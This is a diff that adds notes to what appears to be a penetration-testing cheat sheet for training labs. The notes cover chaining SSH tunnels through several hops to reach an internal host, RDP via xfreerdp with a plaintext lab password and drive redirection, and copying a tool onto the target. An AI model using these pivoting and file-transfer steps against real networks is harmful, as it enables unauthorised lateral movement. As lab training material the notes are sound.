@@ -166,6 +166,46 @@ ssh -D 8000 user@target.thm -fN
 ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN
 ```
 
+### Double Pivot (Multi-Hop SSH Tunneling)
+
+Chain SSH tunnels to reach hosts multiple hops deep.
+
+**Scenario:** Attack Host → dmz01 → DC01 → MGMT01 (172.16.6.25)
+
+**Step 1: Dynamic SOCKS proxy through first hop**
+
+```bash
+ssh -D 9050 htb-student@dmz01
+```
+
+**Step 2: From dmz01, create local forward to target via second hop**
+
+```bash
+ssh -L 5555:172.16.6.25:3389 htb-student@DC01_INTERNAL_IP
+```
+
+**Step 3: RDP from attack host through the chain**
+
+```bash
+xfreerdp /v:localhost:5555 /u:mlefay /p:'Plain Human work!' /drive:shared,/tmp
+```
+
+### xfreerdp with Drive Redirection
+
+Share a local folder via RDP for easy file transfer:
+
+```bash
+xfreerdp /v:TARGET /u:USERNAME /p:'PASSWORD' /drive:shared,/tmp
+```
+
+Inside the RDP session, the shared folder is accessible at `\\tsclient\shared`.
+
+```cmd
+copy \\tsclient\shared\tool.exe C:\Users\Public\tool.exe
+```
+
+---
+
 ### Fixing SSH tunnels that only listen on loopback&#x20;
 
 * if you run into a situation where you are attempting to tunnel and instead of `0.0.0.0` the device only listens on `127.0.0.1` you have two choices&#x20;
